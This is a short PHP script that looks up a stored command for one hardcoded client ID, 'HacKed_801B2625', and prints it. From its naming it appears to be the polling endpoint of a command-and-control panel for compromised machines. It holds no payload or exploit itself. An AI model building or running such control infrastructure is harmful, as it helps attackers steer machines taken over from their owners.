<?php
include_once 'classes/Database.php';
include_once APP_PATH . '/classes/Clients.php';
include_once APP_PATH . '/classes/Utils.php';

$utils = new Utils;

$client = new Clients;
$clientCommand = $client->getCommand("HacKed_801B2625");

if (property_exists($clientCommand, "command")) {
    echo $clientCommand->command;
}
